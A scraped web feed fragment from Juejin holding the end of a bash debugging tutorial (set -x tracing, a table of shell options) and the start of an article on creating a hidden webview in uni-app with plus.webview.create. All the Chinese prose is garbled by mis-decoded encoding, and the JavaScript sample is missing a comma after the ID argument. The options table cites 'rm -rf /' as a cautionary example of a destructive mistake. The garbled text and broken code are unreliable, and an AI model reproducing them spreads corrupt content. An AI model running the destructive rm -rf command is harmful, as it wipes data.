<li>åœ¨å¤´éƒ¨Shebangæ°¸ä¹…å¼€å¯ï¼ˆå¸¸ç”¨äºå¼€å‘é˜¶æ®µï¼‰</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash -x</span>
</code></pre>
<ul>
<li>åœ¨è„šæœ¬å†…åŠ¨æ€å¼€å¯ï¼ˆsetå‘½ä»¤ï¼‰</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">set</span> -x  <span class="hljs-comment"># å¼€å¯è¿½è¸ª</span>
<span class="hljs-comment"># ... ä»£ç  ...</span>
</code></pre>
<h4 data-id="heading-55">è°ƒè¯•è¾“å‡º</h4>
<p>å½“æˆ‘ä»¬å¯ç”¨<code>-x</code>æ¨¡å¼è¿è¡Œå¦‚ä¸‹è„šæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
name=<span class="hljs-string">"Shell"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Hello, <span class="hljs-variable">$name</span>"</span>
</code></pre>
<p>è¾“å‡ºç»“æœå¦‚ä¸‹</p>
<pre><code class="hljs language-bash" lang="bash">+ name=Shell          &lt;-- èµ‹å€¼æ“ä½œ
+ <span class="hljs-built_in">echo</span> <span class="hljs-string">'Hello, Shell'</span> &lt;-- å˜é‡å·²è¢«å±•å¼€ï¼Œ<span class="hljs-variable">$name</span> å˜æˆäº† Shell
Hello, Shell          &lt;-- çœŸå®çš„è„šæœ¬æ‰§è¡Œç»“æœ
</code></pre>
<ul>
<li><code>+</code>ï¼šè¿™æ˜¯è°ƒè¯•ä¿¡æ¯çš„é»˜è®¤å‰ç¼€ï¼ˆç”±ç¯å¢ƒå˜é‡ $PS4 æ§åˆ¶ï¼‰ï¼Œæ¯ä¸€å±‚è°ƒç”¨ï¼ˆå¦‚å‡½æ•°åµŒå¥—ï¼‰ä¼šå¢åŠ ä¸€ä¸ª<code>+</code></li>
<li>å˜é‡å±•å¼€ï¼šæœ€æ ¸å¿ƒçš„ä»·å€¼ï¼å¯æ¸…æ¥šçœ‹åˆ°å˜é‡<code>$name</code>åœ¨æ‰§è¡Œæ—¶å˜æˆäº†ä»€ä¹ˆå€¼ï¼Œ90% çš„ Bug éƒ½èƒ½é€šè¿‡è¿™ä¸ªå‘ç°</li>
</ul>
<h4 data-id="heading-56">å±€éƒ¨è°ƒè¯•</h4>
<p>å¦‚æœè„šæœ¬ä¸ºå‡ åƒè¡Œï¼Œå…¨ç¯‡å¼€å¯<code>-x</code>ä¼šå¯¼è‡´å±å¹•è¢«æµ·é‡æ—¥å¿—æ·¹æ²¡ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨<code>set</code>å‘½ä»¤åŒ…è£¹å‡ºå¯ç–‘ä»£ç æ®µå³å¯</p>
<p>è¯­æ³•å¦‚ä¸‹ï¼ˆæœ‰ç‚¹åç›´è§‰ï¼‰</p>
<ul>
<li><code>set -x</code>ï¼šå¼€å¯è°ƒè¯•ï¼ˆå‡å·ä»£è¡¨ Activateï¼‰</li>
<li><code>set +x</code>ï¼šå…³é—­è°ƒè¯•ï¼ˆåŠ å·ä»£è¡¨ Deactivateï¼‰</li>
</ul>
<p>ç¤ºä¾‹ï¼šåªè°ƒè¯•å¾ªç¯å†…éƒ¨</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"Start process..."</span>

<span class="hljs-comment"># å¼€å¯å±€éƒ¨è°ƒè¯•ï¼šåªå…³å¿ƒå¾ªç¯é‡Œçš„å˜é‡å˜åŒ–</span>
<span class="hljs-built_in">set</span> -x
<span class="hljs-keyword">for</span> (( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++ )); <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># è¿™é‡Œçš„ä¿¡æ¯ä¼šè¢«æ‰“å°å‡ºæ¥ï¼Œå¸¦æœ‰ '+' å‰ç¼€</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Processing index: <span class="hljs-variable">$i</span>"</span>
<span class="hljs-keyword">done</span>
<span class="hljs-built_in">set</span> +x

<span class="hljs-built_in">echo</span> <span class="hljs-string">"End process..."</span> <span class="hljs-comment"># è¿™å¥æ­£å¸¸æ‰§è¡Œï¼Œä¸ä¼šè¢«è¿½è¸ª</span>
</code></pre>
<p>è¿è¡Œè¾“å‡ºå¦‚ä¸‹</p>
<pre><code class="hljs language-bash" lang="bash">Start process...
+ (( i = <span class="hljs-number">0</span> ))
+ (( i &lt; <span class="hljs-number">3</span> ))
+ <span class="hljs-built_in">echo</span> <span class="hljs-string">'Processing index: 0'</span>
Processing index: 0
+ (( i++ ))
+ (( i &lt; <span class="hljs-number">3</span> ))
+ <span class="hljs-built_in">echo</span> <span class="hljs-string">'Processing index: 1'</span>
Processing index: 1
...
+ <span class="hljs-built_in">set</span> +x
End process...
</code></pre>
<h4 data-id="heading-57">è°ƒè¯•é€‰é¡¹</h4>
<p>ä»¥ä¸‹æ˜¯å¼€å‘ä¸­æœ€å¸¸è§çš„é€‰é¡¹æ¸…å•ï¼ŒæŒ‰<strong>å®ç”¨åœºæ™¯</strong>åˆ†ç±»</p>
<p>ğŸ”§ æ ¸å¿ƒè°ƒè¯•ä¸æ’é”™</p>



































<table><thead><tr><th>å‚æ•°</th><th>å…¨ç§°</th><th>ä½œç”¨</th><th>ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>-x</td><td>xtrace</td><td>æ‰“å°æ¯ä¸€è¡Œå‘½ä»¤çš„æ‰§è¡Œè½¨è¿¹</td><td>é€»è¾‘é”™è¯¯è°ƒè¯•ã€å˜é‡å€¼æ£€æŸ¥ï¼ˆ<strong>æœ€å¸¸ç”¨</strong>ï¼‰</td></tr><tr><td>-v</td><td>verbose</td><td>æ‰“å°åŸå§‹è¾“å…¥è¡Œ</td><td>é€šå¸¸é…åˆ -x ä½¿ç”¨ï¼Œç”¨äºå¯¹æ¯”â€œä»£ç åŸæ ·â€å’Œâ€œæ‰§è¡Œå®å†µâ€</td></tr><tr><td>-n</td><td>noexec</td><td>åªæ£€æŸ¥è¯­æ³•ï¼Œä¸è¿è¡Œè„šæœ¬</td><td>æ£€æŸ¥æ˜¯å¦æœ‰ if æ²¡å†™ fiã€æ¼äº†å¼•å·ç­‰ä½çº§è¯­æ³•é”™è¯¯</td></tr><tr><td>-u</td><td>nounset</td><td>é‡åˆ°æœªå®šä¹‰å˜é‡åˆ™æŠ¥é”™</td><td><strong>é˜²å¾¡æ€§ç¼–ç¨‹</strong>ã€‚é˜²æ­¢å› ä¸ºå˜é‡åæ‰“é”™ï¼ˆå¦‚ $file_name å†™æˆ $filenameï¼‰å¯¼è‡´ rm -rf /$filename å˜æˆ rm -rf / çš„æƒ¨å‰§</td></tr></tbody></table>
<p>âš™ï¸ è¡Œä¸ºæ§åˆ¶ä¸è¿è¡Œæ¨¡å¼</p>



































<table><thead><tr><th>å‚æ•°</th><th>å…¨ç§°</th><th>ä½œç”¨</th><th>ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>-f</td><td>noglob</td><td>ç¦æ­¢é€šé…ç¬¦æ‰©å±•ã€‚å³ *, ? ä¸å†è‡ªåŠ¨æ‰©å±•ä¸ºæ–‡ä»¶å</td><td>å½“è„šæœ¬éœ€è¦å¤„ç†å¤§é‡åŒ…å« * çš„ç‰¹æ®Šå­—ç¬¦ä¸²ï¼ˆè€Œéæ–‡ä»¶åï¼‰æ—¶å¼€å¯</td></tr><tr><td>-e</td><td>errexit</td><td>é‡åˆ°é”™è¯¯ç«‹å³é€€å‡º</td><td><strong>CI/CD å¿…å¤‡</strong>ã€‚æ„å»ºè„šæœ¬ä¸€æ—¦æŸä¸€æ­¥å‡ºé”™ï¼Œä¸è¦ç»§ç»­æ‰§è¡Œåç»­æ“ä½œ</td></tr><tr><td>-i</td><td>interactive</td><td>å¼ºåˆ¶è„šæœ¬ä»¥äº¤äº’ Shell è¡Œä¸ºè¿è¡Œ</td><td>è°ƒè¯•.bashrcæˆ–éœ€è¦æ¨¡æ‹Ÿç”¨æˆ·ç»ˆç«¯è¾“å…¥ï¼ˆTTYï¼‰çš„è„šæœ¬</td></tr><tr><td>-t</td><td>-</td><td>è¯»å–å¹¶æ‰§è¡Œå®Œ<strong>ä¸€æ¡</strong>å‘½ä»¤åç«‹åˆ»é€€å‡º</td><td>æå°‘ç”¨çš„è°ƒè¯•æ‰‹æ®µï¼Œç”¨äºç²¾ç»†æ§åˆ¶è„šæœ¬å¯åŠ¨çš„ç¬¬ä¸€æ­¥çŠ¶æ€</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uni-appä½¿ç”¨html5+åˆ›å»ºwebviewï¼Œå¯ä»¥æ§åˆ¶çª—å£å¤§å°ã€æ˜¾éšã€ä¸unié€šä¿¡]]></title>    <link>https://juejin.cn/post/7594863660297994282</link>    <guid>https://juejin.cn/post/7594863660297994282</guid>    <pubDate>2026-01-14T11:03:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594863660297994282" data-draft-id="7594262760939700258" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-appä½¿ç”¨html5+åˆ›å»ºwebviewï¼Œå¯ä»¥æ§åˆ¶çª—å£å¤§å°ã€æ˜¾éšã€ä¸unié€šä¿¡"/> <meta itemprop="keywords" content="å‰ç«¯,Trae"/> <meta itemprop="datePublished" content="2026-01-14T11:03:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æå‰‘ä¸€"/> <meta itemprop="url" content="https://juejin.cn/user/4147782344247918"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-appä½¿ç”¨html5+åˆ›å»ºwebviewï¼Œå¯ä»¥æ§åˆ¶çª—å£å¤§å°ã€æ˜¾éšã€ä¸unié€šä¿¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4147782344247918/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æå‰‘ä¸€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T11:03:25.000Z" title="Wed Jan 14 2026 11:03:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘ä½¿ç”¨ uni-app å¼€å‘å®‰å“ç«¯çš„ Appï¼Œå› ä¸ºè¦åµŒå…¥ä¸€ä¸ªåŸæœ¬å·²ç»å¼€å‘å®Œçš„ç³»ç»Ÿï¼Œæ‰“ç®—ä½¿ç”¨ web-view çš„æ–¹å¼è¿›è¡ŒåµŒå…¥ã€‚</p>
<p>å› ä¸ºé¡¹ç›®å·¥æœŸæ¯”è¾ƒç´§ï¼Œæ‰€ä»¥æ˜¯ä¸¤ä¸ªå‰ç«¯å¹¶è¡Œå¼€å‘ï¼Œæœ€åå†åˆåˆ°ä¸€èµ·ã€‚</p>
<p>ç»“æœå°±æ˜¯è¿™ä¸ªè¿‡ç¨‹ä¸­å‡ºé—®é¢˜äº†...</p>
<h2 data-id="heading-0">éœ€æ±‚</h2>
<p>éœ€æ±‚æ–¹é¢æ˜¯ï¼š</p>
<p><code>AåŒå­¦</code>è´Ÿè´£é€šè®¯æ–¹é¢çš„å·¥ä½œï¼Œæ‰€ä»¥é¡µé¢åº”è¯¥åœ¨é¦–é¡µåŠ è½½çš„æ—¶å€™å°±è¢«æŒ‚è½½ä¸Šå»ï¼Œè¿™æ ·ä¸€æ¥å¯åŠ¨ç³»ç»Ÿçš„æ—¶å€™å°±æ³¨å†Œäº†é€šè®¯æ¨¡å—ï¼Œä¸å½±å“æ”¶å‘ä¿¡æ¯ã€‚</p>
<p><code>BåŒå­¦</code>è´Ÿè´£å…¶ä»–éƒ¨åˆ†ï¼Œåœ¨é¦–é¡µå±•ç¤ºç³»ç»Ÿå†…éƒ¨çš„ç»Ÿè®¡æ•°æ®ï¼Œå¯ä»¥ç®—æ˜¯ä¸€ä¸ªå®‰å“ç«¯çš„ç®€æ˜“å¤§å±ã€‚</p>
<p>åŸæœ¬<code>AåŒå­¦</code>çš„æ–¹æ¡ˆæ˜¯åœ¨ç³»ç»Ÿé¡µé¢ä¸Šåˆ›å»ºä¸€ä¸ª <code>web-view</code>ï¼Œç„¶ååµŒå…¥ç³»ç»Ÿã€‚è¿™æ ·ä¸€æ¥ä¹Ÿä¸å½±å“BåŒå­¦å¼€å‘æ–°ç³»ç»Ÿã€‚</p>
<h2 data-id="heading-1">é—®é¢˜</h2>
<p>ç»“æœæ•´åˆä»£ç çš„æ—¶å€™æ‰å‘ç°ï¼Œ<code>web-view</code>æ ‡ç­¾ æ˜¯<strong>è‡ªåŠ¨é“ºæ»¡æ•´ä¸ªé¡µé¢</strong>çš„ï¼Œè€Œä¸”æ˜¯<strong>æ— æ³•éšè—</strong>çš„ã€‚</p>
<p>è¿™å°±å°´å°¬äº†ï¼ŒAppè¿›æ¥ä»¥åç›´æ¥çœ‹åˆ°çš„å°±æ˜¯ <code>AåŒå­¦</code>çš„é€šè®¯é¡µé¢ï¼Œæ— æ³•çœ‹åˆ°<code>BåŒå­¦</code>çš„å¤§å±äº†ã€‚</p>
<p>é—®é¢˜æŠ›åˆ°äº†æˆ‘æ‰‹é‡Œï¼Œæˆ‘ç»è¿‡ä¸€ç•ªç®€å•çš„è°ƒç ”ï¼Œå†åŠ ä¸Šä¸€é¡¿çŒ›å¦‚è™çš„æ“ä½œï¼Œåˆé€šè¿‡ <strong>Trae</strong> ä¸€é¡¿AIï¼Œæœ€åå›å¤ä»–ä»¬è¯´ï¼š<strong>æ— è§£</strong>ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43f8dfd3e0884546ab40824d14f7de63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768993404&amp;x-signature=lUwkIJyI5td7ffl7BJad83W77OI%3D" alt="image.png" loading="lazy"/></p>
<p>å¯¹æ­¤ <strong>Trae</strong> ç»™å‡ºçš„åŸå› æ˜¯ï¼šuni-app ä¸­å†…ç½®çš„ <code>web-view</code> æ ‡ç­¾æœ¬èº«æ²¡æœ‰éšè—çš„APIï¼Œåœ¨ web-view æ ‡ç­¾å¤–å¢åŠ  view æ ‡ç­¾ï¼Œç»‘å®š <code>v-show</code> æ–¹æ³•ä¸ç”Ÿæ•ˆã€‚</p>
<p>åªèƒ½ç»‘å®š <code>v-if</code> ç”Ÿæ•ˆï¼Œä½†æ˜¯ç»‘å®š <code>v-if=false</code> çš„æ—¶å€™ç›¸å½“äº web-view ç›´æ¥è¢«<strong>é”€æ¯</strong>äº†ï¼Œä¼šå¯¼è‡´é€šè®¯æ¨¡å—æ”¶ä¸åˆ°ä¿¡æ¯ã€‚</p>
<h2 data-id="heading-2">è§£å†³</h2>
<p>å¥½åœ¨å¤©æ— ç»äººä¹‹è·¯ï¼Œuni-app å®˜æ–¹æ–‡æ¡£ä¸­è¡¨ç¤ºï¼šåœ¨ html5+ ä¸­å…¶å®å­˜åœ¨ web-view çš„ APIï¼Œèƒ½å¤Ÿæ“ä½œçª—å£çš„å¤§å°ã€‚</p>
<p>é‚£ä¹ˆæ—¢ç„¶èƒ½å¤Ÿæ“ä½œçª—å£çš„å¤§å°ï¼Œè‚¯å®šä¹Ÿèƒ½å¤Ÿæ§åˆ¶æ˜¾éšã€‚</p>
<p>äºæ˜¯ä¹æˆ‘ä½¿ç”¨ <strong>Trae</strong> è®©ä»–ä½¿ç”¨ html5+ ä¸­çš„ <code>create</code> æ–¹æ³•åˆ›å»º web-viewï¼Œå¹¶ç»™å‡ºå®Œæ•´çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">createWebView</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> that = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span> = plus.<span class="hljs-property">webview</span>.<span class="hljs-title function_">create</span>(
        <span class="hljs-string">'http://192.168.25.110'</span>,
        <span class="hljs-string">'1008610010'</span> <span class="hljs-comment">// IDï¼ˆå¿…é¡»å”¯ä¸€ï¼‰</span>
        {
            <span class="hljs-attr">top</span>: <span class="hljs-string">'24px'</span>,
            <span class="hljs-attr">bottom</span>: <span class="hljs-string">'0px'</span>,
            <span class="hljs-attr">width</span>: <span class="hljs-string">'300px'</span>,
            <span class="hljs-attr">height</span>: <span class="hljs-string">'600px'</span>,
            <span class="hljs-attr">scrollIndicator</span>: <span class="hljs-string">'none'</span>,
            <span class="hljs-attr">scalable</span>: <span class="hljs-literal">false</span>
        }
    );

    <span class="hljs-comment">// è®¾ç½®é¡µé¢é»˜è®¤éšè—</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">hide</span>();
}
</code></pre>
<p>è¿™æ—¶å€™å·²ç»æˆåŠŸåˆ›å»ºäº† web-view å¹¶ä¸”å¤„äºéšè—çŠ¶æ€ï¼Œä¸è€½è¯¯ä¼ å‚ã€‚</p>
<p>ä½†æ˜¯åˆé‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œweb-viewæ— æ³•ä¸uni-app<strong>é€šä¿¡</strong>ã€‚</p>
<p>Trae å…ˆç»™å‡ºäº† uni-app å®˜æ–¹æä¾›çš„æ–¹æ³•ï¼Œä½¿ç”¨ <code>uni.postMessage</code> æ–¹æ³•ï¼Œä½†æ˜¯åœ¨é€šè®¯ç³»ç»Ÿä¸­æ’å…¥äº†è¿™ä¸ªæ–¹æ³•ä»¥åï¼Œä¸æŠ¥é”™ï¼Œå¹¶ä¸”æ˜¾ç¤ºå‘é€æ¶ˆæ¯æˆåŠŸï¼Œä½†uni-app è¿™è¾¹å´æ— æ³•æ¥æ”¶åˆ°ã€‚</p>
<p>Trae åˆä½¿ç”¨ <code>evalJS</code> æ–¹æ³•æ’å…¥ç›¸åº”çš„è„šæœ¬ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰ååº”ã€‚åŒæ ·æ˜¯å‘é€æˆåŠŸï¼Œä½†æ˜¯æ¥æ”¶ä¸åˆ°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0b779ce4c0a4794bd4cdced445bdf0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768993404&amp;x-signature=wYXK%2FZQTfX9bGYH%2B5khBzLiAuOE%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<p>ä¸¤ç§æ–¹æ¡ˆå‡ä¸å¯ç”¨ï¼Œæˆ‘åˆè¯¦ç»†çœ‹äº†çœ‹ uni-app çš„å®˜æ–¹æ–‡æ¡£ï¼Œè®© Trae åˆ†æ web-view æ ‡ç­¾ä¸Šç»‘å®šçš„ <code>@message</code> æ–¹æ³•åº”è¯¥æ˜¯ç»è¿‡ç‰¹æ®Šå°è£…çš„ï¼Œèƒ½å¤Ÿæ•è·åˆ° view-view å†…ä½¿ç”¨ <code>uni.postMessage</code> æ–¹æ³•å‘é€çš„æ•°æ®ã€‚</p>
<p>Traeç»™å‡ºçš„è§£é‡Šæ˜¯ï¼šç”±äºæˆ‘ç°åœ¨ä½¿ç”¨ <code>plus.web-view.create</code> åˆ›å»ºçª—å£ï¼Œç»•è¿‡äº†uni-app æ‰€ä»¥å³ä¾¿æ˜¯ç»‘å®š <code>message</code> ä¹Ÿæ— æ•ˆäº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b0c925c31d3435ab879f6a3908f9626~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768993404&amp;x-signature=Z%2B%2Fx0VnhbT5iKgYi9Gqpbs1TiiU%3D" alt="image.png" loading="lazy"/></p>
